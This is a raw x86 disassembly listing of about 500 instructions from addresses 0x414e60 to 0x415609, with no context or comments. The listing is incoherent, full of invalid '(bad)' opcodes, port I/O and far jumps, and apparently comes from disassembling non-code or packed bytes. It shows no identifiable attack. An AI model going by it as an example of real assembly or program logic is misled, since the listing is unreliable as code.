  414e60:	jmp    0x1345:0x9b9059c6
  414e67:	push   0xffffffd6
  414e69:	mov    edx,0x8ee6bd32
  414e6e:	cli    
  414e6f:	push   ecx
  414e70:	mov    ch,0x23
  414e72:	call   0x3f96:0xb8cddb32
  414e79:	and    BYTE PTR [edx+0x7],bl
  414e7c:	loop   0x414e70
  414e7e:	popa   
  414e7f:	(bad)  
  414e81:	out    0x3f,eax
  414e83:	test   BYTE PTR [esi-0x21b0d89f],ah
  414e89:	int    0xea
  414e8b:	adc    bh,BYTE PTR [ebx-0xb]
  414e8e:	xchg   BYTE PTR [ebp+0x43],al
  414e91:	jle    0x414ebd
  414e93:	in     al,0x85
  414e95:	sahf   
  414e96:	mov    esp,?
  414e98:	pop    edx
  414e99:	or     al,0x35
  414e9b:	popa   
  414e9c:	cmp    BYTE PTR [ecx-0x52],ch
  414e9f:	ss jg  0x414ee1
  414ea2:	xor    BYTE PTR [esi+eiz*8],0x57
  414ea6:	int    0xc
  414ea8:	mov    ebp,0xbe735cce
  414ead:	mov    eax,0x6e72fb2a
  414eb2:	bound  ebp,QWORD PTR [edx]
  414eb4:	sub    ecx,DWORD PTR [esp+edi*1+0x6cdcba1e]
  414ebb:	and    dh,BYTE PTR [eax-0x36]
  414ebe:	sbb    eax,DWORD PTR [edi-0x497d1088]
  414ec4:	xchg   ecx,eax
  414ec5:	ins    BYTE PTR es:[edi],dx
  414ec6:	xchg   ebx,eax
  414ec7:	or     dl,BYTE PTR [ebx+edx*1-0x1fbd733c]
  414ece:	and    BYTE PTR [edx+0x6126e1ed],dh
  414ed4:	mov    eax,0x863e694b
  414ed9:	mov    bh,al
  414edb:	out    0x70,eax
  414edd:	out    dx,eax
  414ede:	sub    BYTE PTR [edx+0x55],ch
  414ee1:	mov    esi,DWORD PTR [edx+0x39]
  414ee4:	ins    BYTE PTR es:[edi],dx
  414ee5:	xor    eax,0x7d0cfeae
  414eeb:	cs aas 
  414eed:	jp     0x414e8e
  414eef:	jb     0x414ea4
  414ef1:	mov    edi,ecx
  414ef3:	repz push 0x74
  414ef6:	aam    0xf8
  414ef8:	ficomp DWORD PTR [edx-0x3e]
  414efb:	lods   eax,DWORD PTR ds:[esi]
  414efc:	cmp    al,0x2d
  414efe:	aas    
  414eff:	ins    DWORD PTR es:[edi],dx
  414f00:	push   ds
  414f01:	xchg   ecx,eax
  414f02:	stos   BYTE PTR es:[edi],al
  414f03:	repz pusha 
  414f05:	inc    ecx
  414f06:	ret    0x73e9
  414f09:	push   edx
  414f0a:	or     eax,0x1eb18549
  414f0f:	cmp    edx,DWORD PTR [esi+edi*4]
  414f12:	jge    0x414ea6
  414f14:	retf   0x510a
  414f17:	scas   al,BYTE PTR es:[edi]
  414f18:	xchg   esp,ecx
  414f1a:	fisub  WORD PTR [eax-0x53]
  414f1d:	out    0x17,eax
  414f1f:	scas   eax,DWORD PTR es:[edi]
  414f20:	retf   0xa958
  414f23:	not    dl
  414f25:	inc    edx
  414f26:	xor    esi,DWORD PTR [eax-0x7284e73f]
  414f2c:	call   FWORD PTR [eax+0x1070bfe5]
  414f32:	sub    ah,cl
  414f34:	clc    
  414f35:	push   0x95605af4
  414f3a:	and    BYTE PTR [ebp-0x15a93003],bl
  414f40:	cmp    esi,DWORD PTR [edx]
  414f42:	push   ebx
  414f43:	and    eax,0x31
  414f46:	adc    DWORD PTR [ecx],0x51
  414f49:	shl    DWORD PTR [ecx],cl
  414f4b:	mov    al,0x39
  414f4d:	sbb    al,0xef
  414f4f:	popf   
  414f50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f51:	ret    0x48d
  414f54:	lea    edi,[edi+eiz*4]
  414f57:	(bad)  
  414f58:	sub    DWORD PTR [eax-0x2e9f4e21],edx
  414f5e:	pop    edi
  414f5f:	jmp    0x8889:0x30c7021
  414f66:	sub    ah,0x96
  414f69:	fcomp  QWORD PTR [edi]
  414f6b:	sbb    eax,0x90b4c0e0
  414f70:	aaa    
  414f71:	dec    esp
  414f72:	in     eax,0x7c
  414f74:	ja     0x414ef9
  414f76:	or     ch,dh
  414f78:	xchg   edx,eax
  414f79:	sbb    BYTE PTR [edi+0x4d],dh
  414f7c:	lods   eax,DWORD PTR ds:[esi]
  414f7d:	jmp    0x414f33
  414f7f:	scas   al,BYTE PTR es:[edi]
  414f80:	fadd   st(7),st
  414f82:	xor    BYTE PTR [edx-0x7f],dl
  414f85:	fsub   st,st(1)
  414f87:	ds xor al,0x88
  414f8a:	nop
  414f8b:	dec    esp
  414f8c:	aam    0xf3
  414f8e:	sub    ah,ch
  414f90:	jno    0x414f33
  414f92:	push   es
  414f93:	mov    al,0x5e
  414f95:	jnp    0x414fa5
  414f97:	daa    
  414f98:	xor    al,0x23
  414f9a:	(bad)  
  414f9b:	aam    0x2c
  414f9d:	push   esi
  414f9e:	mov    al,0x52
  414fa0:	cmp    DWORD PTR [ebp+0x7b043d85],0xffffffee
  414fa7:	sub    DWORD PTR [edi+0x26],esp
  414faa:	stos   DWORD PTR es:[edi],eax
  414fab:	rol    BYTE PTR [esi],1
  414fad:	loopne 0x414f9f
  414faf:	dec    BYTE PTR [edx-0x3b542d78]
  414fb5:	xchg   BYTE PTR [esi+0x57c5601d],ch
  414fbb:	fucomi st,st(4)
  414fbd:	fucomp st(2)
  414fbf:	xchg   edx,eax
  414fc0:	xor    al,0xe7
  414fc2:	jb     0x414f45
  414fc4:	lods   al,BYTE PTR ds:[esi]
  414fc5:	sbb    al,BYTE PTR [ecx]
  414fc7:	jno    0x414f5f
  414fc9:	add    al,0x4e
  414fcb:	clc    
  414fcc:	pop    esi
  414fcd:	(bad)  
  414fce:	aaa    
  414fcf:	add    eax,0xdd048673
  414fd4:	jbe    0x414f5d
  414fd6:	in     eax,dx
  414fd7:	arpl   si,ax
  414fd9:	inc    ebp
  414fda:	push   ecx
  414fdb:	in     eax,dx
  414fdc:	test   al,0x57
  414fde:	mov    ah,0x81
  414fe0:	jnp    0x414f74
  414fe2:	cdq    
  414fe3:	add    dl,dh
  414fe5:	fs inc eax
  414fe7:	and    al,0x8a
  414fe9:	fild   WORD PTR [edi]
  414feb:	dec    edx
  414fec:	push   ds
  414fed:	inc    edi
  414fee:	mov    cl,0x60
  414ff0:	lock xchg esi,eax
  414ff2:	outs   dx,DWORD PTR ds:[esi]
  414ff3:	pop    eax
  414ff4:	in     al,dx
  414ff5:	cmp    DWORD PTR [ecx],0xaac60cd2
  414ffb:	or     eax,0x4152c5c8
  415000:	or     ebp,DWORD PTR [ecx+0x34]
  415003:	inc    edx
  415004:	int3   
  415005:	mov    edx,0x794e2014
  41500a:	push   es
  41500b:	sub    edi,DWORD PTR [ebx+0x31bd1b60]
  415011:	mov    ecx,0x7b6f8ccb
  415016:	adc    cl,bh
  415018:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415019:	(bad)  
  41501a:	sti    
  41501b:	ins    BYTE PTR es:[edi],dx
  41501c:	mov    edx,0xeed35050
  415021:	int3   
  415022:	es popa 
  415024:	into   
  415025:	fist   WORD PTR [esi-0x48]
  415028:	xchg   eax,edi
  41502a:	sub    BYTE PTR [esi-0x4c],cl
  41502d:	scas   eax,DWORD PTR es:[edi]
  41502e:	(bad)  
  41502f:	sbb    dh,BYTE PTR [edx+0x10]
  415032:	inc    ecx
  415033:	cmp    eax,0x996e3382
  415038:	dec    esi
  415039:	sub    ecx,esi
  41503b:	stc    
  41503c:	cwde   
  41503d:	cs ja  0x4150ad
  415040:	test   DWORD PTR [ebx],0xd75755b0
  415046:	int    0x57
  415048:	add    edi,edx
  41504a:	adc    al,0x38
  41504c:	xchg   edi,eax
  41504d:	mov    ch,0xee
  41504f:	fidivr WORD PTR [ebp-0x417b5b4c]
  415055:	sub    BYTE PTR ds:0x58b102f6,bh
  41505b:	pop    eax
  41505c:	stos   BYTE PTR es:[edi],al
  41505d:	fs frndint 
  415060:	into   
  415061:	fstp   DWORD PTR [ebp-0x5e]
  415064:	in     al,0xa7
  415066:	and    al,0xdd
  415068:	sub    al,dh
  41506a:	mov    BYTE PTR [ebx+0x59],dl
  41506d:	ins    DWORD PTR es:[edi],dx
  41506e:	lods   al,BYTE PTR ds:[esi]
  41506f:	pop    ecx
  415070:	jae    0x41501d
  415072:	cdq    
  415073:	out    0xad,al
  415075:	jmp    0x415033
  415077:	ins    BYTE PTR es:[edi],dx
  415078:	push   ss
  415079:	and    DWORD PTR [edx+0x481690c1],eax
  41507f:	dec    edi
  415080:	jne    0x415044
  415082:	push   ss
  415083:	pop    ecx
  415084:	dec    eax
  415085:	(bad)  
  415086:	fwait
  415087:	push   cs
  415088:	mov    dl,0x5e
  41508a:	add    BYTE PTR fs:[esi],bh
  41508d:	jecxz  0x415057
  41508f:	pop    ebp
  415090:	mov    eax,ebx
  415092:	ja     0x4150b6
  415094:	xchg   esp,eax
  415095:	dec    ebx
  415096:	ja     0x415062
  415098:	div    BYTE PTR [edx-0x7683913c]
  41509e:	leave  
  41509f:	fwait
  4150a0:	xor    al,0x21
  4150a2:	push   ds
  4150a3:	mul    al
  4150a5:	xchg   edi,eax
  4150a6:	pop    ecx
  4150a7:	jb     0x4150e4
  4150a9:	fwait
  4150aa:	into   
  4150ab:	out    0x51,eax
  4150ad:	mov    ds:0x5eba135c,al
  4150b2:	addr16 and eax,0xd7362e09
  4150b8:	xor    al,0x7c
  4150ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150bb:	or     cl,dh
  4150bd:	add    al,0xec
  4150bf:	addr16 loopne 0x4150e6
  4150c2:	cmc    
  4150c3:	sbb    ah,BYTE PTR [edx+0x49]
  4150c6:	xchg   esi,eax
  4150c7:	mov    dh,cl
  4150c9:	xchg   edi,eax
  4150ca:	(bad)  
  4150cc:	out    dx,al
  4150cd:	jmp    0x2afe:0x3c538c7e
  4150d4:	jle    0x415071
  4150d6:	pop    esi
  4150d7:	dec    ebx
  4150d8:	pop    ecx
  4150d9:	xchg   edx,eax
  4150da:	outs   dx,BYTE PTR ds:[esi]
  4150db:	push   eax
  4150dc:	xchg   esp,eax
  4150dd:	add    BYTE PTR [esi-0x1a],dl
  4150e0:	inc    ecx
  4150e1:	retf   
  4150e2:	push   esp
  4150e3:	xchg   edi,eax
  4150e4:	sub    dl,BYTE PTR [esp+esi*4-0x55]
  4150e8:	rdtsc  
  4150ea:	inc    ebp
  4150eb:	and    ebp,ebp
  4150ed:	pop    es
  4150ee:	(bad)  
  4150ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150f0:	nop
  4150f1:	(bad)  
  4150f3:	xchg   ecx,eax
  4150f4:	js     0x415140
  4150f6:	lea    ecx,[eax]
  4150f8:	pop    edx
  4150f9:	inc    edi
  4150fa:	xchg   edx,eax
  4150fb:	dec    esp
  4150fc:	xchg   ecx,eax
  4150fd:	pop    ss
  4150fe:	sub    DWORD PTR [eax-0x61805e83],esi
  415104:	or     DWORD PTR [esi+0x3af0aba5],edi
  41510a:	sub    edx,DWORD PTR [ecx+edi*4]
  41510d:	sbb    al,0x8e
  41510f:	and    BYTE PTR [ebp-0x4f],bl
  415112:	int3   
  415113:	mov    cl,BYTE PTR [esp+edx*8+0x4c]
  415117:	or     BYTE PTR [ebp-0x4d],0xe4
  41511b:	adc    al,0x7a
  41511d:	adc    al,bh
  41511f:	into   
  415120:	ret    0x1b45
  415123:	pop    es
  415124:	dec    ecx
  415125:	nop
  415126:	or     ecx,ebx
  415128:	sbb    ebp,DWORD PTR [ebp+0x7974cfe2]
  41512e:	pusha  
  41512f:	jle    0x41513a
  415131:	xchg   BYTE PTR [eax-0x68d2c3d6],cl
  415137:	addr16 sti 
  415139:	arpl   WORD PTR [bx+si+0x2595],ax
  41513e:	push   es
  41513f:	jae    0x4150d2
  415141:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415142:	mov    al,ds:0xf5f2b43c
  415147:	iret   
  415148:	dec    edx
  415149:	pop    edi
  41514a:	ss inc esi
  41514c:	dec    edx
  41514d:	sub    ebp,DWORD PTR [ebx+0x37]
  415150:	int3   
  415151:	jle    0x4151ba
  415153:	cdq    
  415154:	inc    ecx
  415155:	out    0x1f,al
  415157:	iret   
  415158:	xor    al,0xa7
  41515a:	int3   
  41515b:	mov    cl,0xa5
  41515d:	div    BYTE PTR [edi-0x122b1a19]
  415163:	inc    ecx
  415164:	mov    al,0x56
  415166:	pop    esp
  415167:	mov    eax,ds:0xbca4beb1
  41516c:	out    dx,eax
  41516d:	mov    ds:0xdfcdb8f8,al
  415172:	sub    al,BYTE PTR [edx-0x46e7fa01]
  415178:	shr    ah,1
  41517a:	(bad)  
  41517b:	mov    al,ds:0x71ec43ca
  415180:	and    DWORD PTR [ebp+eax*1-0x20],ebp
  415184:	and    eax,0x217f5e2d
  415189:	(bad)
  41518c:	shl    dl,0xd5
  41518f:	pop    ebp
  415190:	pop    ss
  415191:	pop    ds
  415192:	xor    eax,0xe471e8fc
  415197:	outs   dx,DWORD PTR ds:[esi]
  415198:	loopne 0x415140
  41519a:	fldcw  WORD PTR [eax-0xeab7137]
  4151a0:	sbb    edx,DWORD PTR [edi]
  4151a2:	out    0x46,al
  4151a4:	mov    ds:0xce3c69df,al
  4151a9:	jo     0x415155
  4151ab:	xor    edi,edx
  4151ad:	imul   eax,DWORD PTR [ebx-0x45],0x46d416a6
  4151b4:	mul    BYTE PTR [edx]
  4151b6:	and    al,0xa3
  4151b8:	cmp    BYTE PTR [ecx+0x72],al
  4151bb:	loop   0x41519f
  4151bd:	inc    ebp
  4151be:	adc    BYTE PTR [edi+0x56fe5a2],ch
  4151c4:	and    al,0xc2
  4151c6:	mov    ebx,0x2c2e7b4d
  4151cb:	cmp    eax,DWORD PTR ss:[eax+0x7c2ff362]
  4151d2:	aaa    
  4151d3:	inc    esp
  4151d4:	ror    DWORD PTR [ebx],0x3
  4151d7:	shr    BYTE PTR [eax+0x61205117],cl
  4151dd:	ss sbb al,0x45
  4151e0:	jbe    0x4151c5
  4151e2:	js     0x415164
  4151e4:	push   ds
  4151e5:	retf   0x91bb
  4151e8:	pop    ecx
  4151e9:	pop    ecx
  4151ea:	xchg   edi,eax
  4151eb:	in     eax,0x13
  4151ed:	sbb    al,0x48
  4151ef:	inc    edx
  4151f0:	jae    0x41526d
  4151f2:	retf   
  4151f3:	out    0x58,al
  4151f5:	rol    BYTE PTR [ecx],1
  4151f7:	clc    
  4151f8:	jmp    0x4151b6
  4151fa:	mov    al,0x7
  4151fc:	mov    esp,0xb2dd9cb0
  415201:	or     ecx,DWORD PTR [esi+0x75]
  415204:	pusha  
  415205:	dec    ebx
  415206:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415207:	in     al,dx
  415208:	pop    eax
  415209:	pop    esi
  41520a:	cmp    BYTE PTR [ebp+0x29],dl
  41520d:	xchg   BYTE PTR [edi-0x41db6a17],al
  415213:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415214:	xor    eax,0x3725f907
  415219:	mov    ecx,0x2a45e715
  41521e:	ss pop edx
  415220:	lods   eax,DWORD PTR ds:[esi]
  415221:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415222:	lock push es
  415224:	mov    cl,0xc9
  415226:	mov    ds:0xca5064c4,eax
  41522b:	ror    BYTE PTR [edi+0x49c2a59d],cl
  415231:	add    al,0x22
  415233:	(bad)  
  415234:	adc    BYTE PTR [ecx+0x1e],bl
  415237:	call   0x20f8298c
  41523c:	iret   
  41523d:	test   BYTE PTR [ecx-0x5b4671ad],cl
  415243:	push   ss
  415244:	fpatan 
  415246:	mov    edi,0x44b5da53
  41524b:	std    
  41524c:	pop    eax
  41524d:	call   0x932e:0xa130a9c4
  415254:	arpl   WORD PTR [edx+0x10],di
  415257:	mov    cl,0xdd
  415259:	jno    0x415250
  41525b:	(bad)  
  41525d:	or     ah,BYTE PTR [edx-0x171cd254]
  415263:	repnz cld 
  415265:	outs   dx,DWORD PTR ds:[esi]
  415266:	inc    eax
  415267:	test   DWORD PTR [edx],eax
  415269:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41526a:	test   BYTE PTR fs:[edx-0x6b686f12],0x78
  415272:	mov    ebx,0x88ae1b66
  415277:	xchg   edx,eax
  415278:	mov    eax,cs
  41527a:	sbb    al,dh
  41527c:	fcmovnbe st,st(1)
  41527e:	outs   dx,DWORD PTR ds:[esi]
  41527f:	push   0x58
  415281:	cmp    al,0xf0
  415283:	cmp    bh,BYTE PTR [eax-0x80]
  415286:	psubsw mm0,QWORD PTR ds:0x90a924db
  41528d:	loop   0x4152e4
  41528f:	es jmp 0x60e03ece
  415295:	and    eax,0x8f6c2449
  41529a:	xor    eax,0x3f596862
  41529f:	lods   eax,DWORD PTR ds:[esi]
  4152a0:	inc    eax
  4152a1:	dec    esp
  4152a2:	push   ecx
  4152a3:	mov    edi,0xc53b6291
  4152a8:	push   ebx
  4152a9:	jp     0x41529d
  4152ab:	les    edi,FWORD PTR ds:0x703bf4e6
  4152b1:	shl    ecx,0x6
  4152b4:	rol    BYTE PTR [edi],1
  4152b6:	retf   
  4152b7:	and    dl,BYTE PTR [ebx+0x56]
  4152ba:	mov    DWORD PTR [edi+0x28],edx
  4152bd:	call   DWORD PTR [ebx+eax*2-0x50772428]
  4152c4:	dec    esi
  4152c5:	jg     0x4152a2
  4152c7:	push   ss
  4152c8:	aad    0x3c
  4152ca:	test   DWORD PTR [ebp-0x6127745e],ebx
  4152d0:	ror    BYTE PTR [esi+eiz*8+0x6e],cl
  4152d4:	and    DWORD PTR [esi],0xb486f224
  4152da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152db:	cmp    ch,dh
  4152dd:	inc    esi
  4152de:	popf   
  4152df:	jne    0x4152f6
  4152e1:	fdiv   QWORD PTR [edi-0x213b9660]
  4152e7:	pop    ds
  4152e8:	mov    dh,0xea
  4152ea:	inc    esi
  4152eb:	mov    cl,0xdc
  4152ed:	lds    esi,FWORD PTR [esi+ebx*2]
  4152f0:	shl    BYTE PTR [esp+edi*1+0x8],1
  4152f4:	mov    ds:0x76e96ee5,eax
  4152f9:	or     cl,BYTE PTR [ecx+0x55]
  4152fc:	scas   eax,DWORD PTR es:[edi]
  4152fd:	mov    ah,0xfc
  4152ff:	fwait
  415300:	adc    DWORD PTR [edi],ebp
  415302:	pop    esi
  415303:	jns    0x4152ef
  415305:	test   DWORD PTR [eax-0x2e],ebp
  415308:	pop    ebx
  415309:	sub    cl,BYTE PTR [ebx]
  41530b:	loop   0x41529e
  41530d:	repz (bad) 
  41530f:	pop    eax
  415310:	test   DWORD PTR [edx-0x46],edi
  415313:	pop    eax
  415314:	lods   al,BYTE PTR ds:[esi]
  415315:	call   0x178605cb
  41531a:	dec    esp
  41531b:	xor    DWORD PTR [ebp+0x78],edx
  41531e:	out    0x83,al
  415320:	cmp    ecx,DWORD PTR [edx-0xa5de74f]
  415326:	push   esi
  415327:	xor    al,0xd7
  41532a:	pop    esi
  41532b:	xor    DWORD PTR [edi+0x41],esp
  41532e:	pop    esi
  41532f:	(bad)  
  415330:	and    DWORD PTR [edx],ecx
  415332:	push   edx
  415333:	daa    
  415334:	jmp    0x2418327b
  415339:	out    dx,ax
  41533b:	add    eax,DWORD PTR [ebx+0x4fff838a]
  415341:	push   ebp
  415342:	mov    edx,0xd1f59b3
  415347:	call   0x525fc1ec
  41534c:	dec    ebx
  41534d:	jbe    0x4152e1
  41534f:	sub    eax,0x64c61dc5
  415354:	xchg   edx,eax
  415355:	fcomip st,st(3)
  415358:	leave  
  415359:	lods   al,BYTE PTR ds:[esi]
  41535a:	sbb    al,0x22
  41535c:	repz jae 0x4152f0
  41535f:	shr    DWORD PTR [ebx+ecx*8+0x2],cl
  415363:	test   eax,0xac87ce5c
  415368:	pushf  
  415369:	loop   0x41535d
  41536b:	pop    ecx
  41536c:	jecxz  0x415380
  41536e:	jge    0x4153d6
  415370:	sahf   
  415371:	or     al,0xa6
  415373:	xor    ax,0x57aa
  415377:	xlat   BYTE PTR ds:[ebx]
  415378:	retf   0xb6fe
  41537b:	xchg   esi,eax
  41537c:	jge    0x415363
  41537e:	or     al,0x94
  415380:	add    al,0xfa
  415382:	scas   al,BYTE PTR es:[edi]
  415383:	sub    cl,BYTE PTR [ecx]
  415385:	push   edi
  415386:	(bad)  
  415387:	adc    esp,DWORD PTR [ecx]
  415389:	xchg   edi,eax
  41538a:	icebp  
  41538b:	into   
  41538c:	call   0xd7831704
  415391:	dec    ebp
  415392:	shl    BYTE PTR [esi-0x57],1
  415395:	cwde   
  415396:	jnp    0x415388
  415398:	mov    cl,cl
  41539a:	mov    ebp,0x2ccd2c73
  41539f:	adc    DWORD PTR [eax+0x37],edx
  4153a2:	mov    eax,ds:0xdaf8d719
  4153a7:	aam    0x6a
  4153a9:	clc    
  4153aa:	xchg   esp,eax
  4153ab:	mov    al,ds:0x8014a784
  4153b0:	xchg   ebx,eax
  4153b1:	pop    es
  4153b2:	mov    al,ds:0x6d71214f
  4153b7:	pop    edi
  4153b8:	(bad)  [ebx]
  4153ba:	call   0xf34d5e3b
  4153bf:	adc    ecx,0x10f48d54
  4153c5:	je     0x4153e5
  4153c7:	push   cs
  4153c8:	loop   0x4153b0
  4153ca:	adc    bl,BYTE PTR ds:0x91312fc3
  4153d0:	push   ebp
  4153d1:	mov    edx,0x96257417
  4153d6:	fld    TBYTE PTR [eax-0xa]
  4153d9:	sbb    ebp,0xf23136c3
  4153df:	push   0xdde87028
  4153e4:	fcmovne st,st(3)
  4153e6:	cs das 
  4153e8:	(bad)  
  4153e9:	adc    al,0xc9
  4153eb:	ret    
  4153ec:	popf   
  4153ed:	enter  0xcb2,0xb0
  4153f1:	pop    ss
  4153f2:	mov    esi,0x18a88939
  4153f7:	mov    bl,cl
  4153f9:	inc    edi
  4153fa:	(bad)  
  4153fb:	mov    esi,0x82ffddb2
  415400:	xor    esi,DWORD PTR [ebx-0x42]
  415403:	inc    eax
  415404:	sbb    bl,bh
  415406:	in     al,0x4d
  415408:	cwde   
  415409:	leave  
  41540a:	xrelease mov BYTE PTR [ebx+eiz*4-0x403c9280],bl
  415412:	sub    al,0x95
  415415:	inc    esi
  415416:	dec    ebp
  415417:	mov    al,ds:0x838b825d
  41541c:	cdq    
  41541d:	test   al,0x89
  41541f:	nop
  415420:	add    ch,cl
  415422:	ficomp WORD PTR [edx]
  415424:	push   esp
  415425:	push   0xc3d23ee3
  41542a:	pop    edx
  41542b:	mov    BYTE PTR [edi+ebx*1-0x77b2021f],dl
  415432:	test   DWORD PTR [edx+ecx*1],0x7ed1ec39
  415439:	xor    DWORD PTR [esi+0x61008d01],0xffffffd9
  415440:	repnz std 
  415442:	mov    dl,0x2e
  415444:	mov    WORD PTR [eax],?
  415446:	cmp    al,BYTE PTR [ecx-0x2c]
  415449:	es sbb bl,cl
  41544c:	lahf   
  41544d:	xchg   ebx,eax
  41544e:	cmp    DWORD PTR [ebx+0x182e555],ebp
  415454:	icebp  
  415455:	imul   ebx,DWORD PTR [eax+0x1d22c8af],0xca422eb1
  41545f:	cmp    eax,0x1cc9f929
  415464:	jo     0x41546f
  415466:	inc    esi
  415467:	mov    BYTE PTR [ecx],0xd9
  41546a:	sub    esi,DWORD PTR [ebx]
  41546c:	push   0x13efa021
  415471:	mov    WORD PTR ds:0xa5a15060,gs
  415477:	ds sar edx,cl
  41547a:	mul    esp
  41547c:	pop    esi
  41547d:	dec    edx
  41547e:	retf   
  41547f:	sub    edi,ecx
  415481:	mov    bh,0x8f
  415483:	mov    bh,0x56
  415485:	stos   DWORD PTR es:[edi],eax
  415486:	jp     0x41548a
  415488:	scas   al,BYTE PTR es:[edi]
  415489:	call   0x3387:0x1a8ca267
  415490:	jge    0x41543f
  415492:	pop    es
  415493:	imul   esi,esi,0x4f4839b8
  415499:	sbb    al,BYTE PTR [ebx-0x2bae21bc]
  41549f:	ret    
  4154a0:	arpl   WORD PTR [edx-0x6c],bx
  4154a3:	test   al,0xb1
  4154a5:	into   
  4154a6:	pop    esi
  4154a7:	fcmovu st,st(1)
  4154a9:	out    dx,eax
  4154aa:	jne    0x41551f
  4154ac:	jno    0x415441
  4154ae:	jl     0x415524
  4154b0:	pop    ecx
  4154b1:	scas   eax,DWORD PTR es:[edi]
  4154b2:	test   DWORD PTR [ecx+edx*2],0x30e9d521
  4154b9:	push   ebx
  4154ba:	addr16 inc edi
  4154bc:	in     al,dx
  4154bd:	aas    
  4154be:	in     eax,0x4c
  4154c0:	scas   al,BYTE PTR es:[edi]
  4154c1:	jmp    0x814d0099
  4154c6:	jmp    0xdb:0x4d6b3096
  4154cd:	icebp  
  4154ce:	cmp    edi,DWORD PTR [esi+0x3213e041]
  4154d4:	jo     0x4154d8
  4154d6:	jle    0x4154af
  4154d8:	les    edx,FWORD PTR [ebp+0x67]
  4154db:	iret   
  4154dc:	stc    
  4154dd:	inc    eax
  4154de:	popf   
  4154df:	and    DWORD PTR [ecx+0x0],esp
  4154e2:	fmul   DWORD PTR [ebx]
  4154e4:	(bad)  
  4154e5:	in     al,dx
  4154e6:	mov    BYTE PTR [edx+0x12b995ec],ch
  4154ec:	xor    dh,BYTE PTR [ebx-0x664b5175]
  4154f2:	dec    esp
  4154f3:	jge    0x4154f0
  4154f5:	xlat   BYTE PTR ds:[ebx]
  4154f6:	push   ebp
  4154f7:	mov    al,ds:0xd4f99630
  4154fc:	jns    0x415526
  4154fe:	ins    DWORD PTR es:[edi],dx
  4154ff:	push   ebx
  415500:	jae    0x415484
  415502:	(bad)  
  415503:	out    0xb3,al
  415505:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415506:	adc    DWORD PTR [eax],ebp
  415508:	jmp    0x4154bc
  41550a:	je     0x415581
  41550c:	lea    edx,[eax]
  41550e:	jp     0x415511
  415510:	rol    BYTE PTR [ebx],1
  415512:	test   eax,esi
  415514:	xchg   DWORD PTR [ebx+0x36991962],ecx
  41551a:	shl    BYTE PTR [ecx+0x6e],1
  41551d:	fdivrp st(7),st
  41551f:	aad    0x6a
  415521:	popf   
  415522:	out    dx,al
  415523:	jp     0x415551
  415525:	out    dx,eax
  415526:	dec    ecx
  415527:	sub    al,0xee
  415529:	outs   dx,BYTE PTR ds:[esi]
  41552a:	outs   dx,DWORD PTR ds:[esi]
  41552b:	jo     0x415529
  41552d:	shl    DWORD PTR [eax+0x6b],1
  415530:	sub    DWORD PTR [eax],ecx
  415532:	jge    0x415578
  415534:	ror    ch,0xf9
  415537:	push   ecx
  415538:	push   ss
  415539:	mov    dl,0xfc
  41553b:	stc    
  41553c:	shl    DWORD PTR [edi],cl
  41553e:	push   edx
  41553f:	add    dh,dl
  415541:	sub    eax,0x7b51c4b3
  415546:	div    ah
  415548:	pop    ebp
  415549:	sbb    edi,0xe9121c1f
  41554f:	mov    ds:0xb03644c7,eax
  415554:	sub    dl,dl
  415556:	popa   
  415557:	leave  
  415558:	jo     0x415508
  41555a:	mov    dl,BYTE PTR [eax]
  41555c:	adc    DWORD PTR [edi+0x7476f2f2],ecx
  415562:	leave  
  415563:	fcom   DWORD PTR [ecx+0x344710c7]
  415569:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41556a:	sti    
  41556b:	cli    
  41556c:	xor    BYTE PTR [di],cl
  41556f:	jle    0x415522
  415571:	mov    ch,0x1d
  415573:	push   ebp
  415574:	add    BYTE PTR [ebx],ah
  415576:	xor    edx,edx
  415578:	cmp    DWORD PTR [edi+0x66],0xffffff84
  41557c:	lods   al,BYTE PTR ds:[esi]
  41557d:	push   ds
  41557e:	mov    cl,0xd3
  415580:	iret   
  415581:	mov    DWORD PTR [ecx-0x42a7039f],edi
  415587:	xor    edi,esp
  415589:	xor    eax,0xdc2b1509
  41558e:	call   0x3b31e2ab
  415593:	lock adc al,0x88
  415596:	pop    eax
  415597:	cmp    al,dh
  415599:	fild   DWORD PTR [edi+0x4b]
  41559c:	inc    ebp
  41559d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41559e:	inc    ecx
  41559f:	ficomp DWORD PTR [edx+0x9a7f52b]
  4155a5:	pop    ebx
  4155a6:	pop    esi
  4155a7:	arpl   WORD PTR [ecx+0x3a],di
  4155aa:	add    bh,BYTE PTR [edi-0x3ff172b]
  4155b0:	push   es
  4155b1:	nop
  4155b2:	and    al,bh
  4155b4:	aaa    
  4155b5:	or     ebx,DWORD PTR [edx+0x3f]
  4155b8:	int3   
  4155b9:	cmp    ch,ah
  4155bb:	push   ds
  4155bc:	out    dx,al
  4155bd:	xchg   ebp,eax
  4155be:	mul    al
  4155c0:	xor    edi,esp
  4155c2:	mov    ch,0xce
  4155c4:	fild   WORD PTR [eax]
  4155c6:	xlat   BYTE PTR ds:[ebx]
  4155c7:	test   DWORD PTR [esi+0x3c],esp
  4155ca:	repz repnz sbb al,0x8c
  4155ce:	test   eax,0x82a4302d
  4155d3:	mov    al,0xff
  4155d5:	shl    DWORD PTR [eax-0x28],0x92
  4155d9:	jl     0x4155f3
  4155db:	add    BYTE PTR [esp+eax*4+0x41d9d5e5],0x62
  4155e3:	call   0x4e23651e
  4155e8:	pop    edi
  4155e9:	jmp    0x41565e
  4155eb:	and    dl,BYTE PTR es:[esi-0x38]
  4155ef:	outs   dx,BYTE PTR ds:[esi]
  4155f0:	mov    dh,0x95
  4155f2:	sub    al,0x4f
  4155f4:	pop    edx
  4155f5:	cld    
  4155f6:	cmp    al,0xbd
  4155f8:	mov    ebx,0xdf51451a
  4155fd:	pop    eax
  4155fe:	mov    ch,0xc2
  415600:	adc    eax,0xe220740c
  415605:	aam    0x63
  415607:	cmp    al,0x6f
  415609:	or     bh,ch
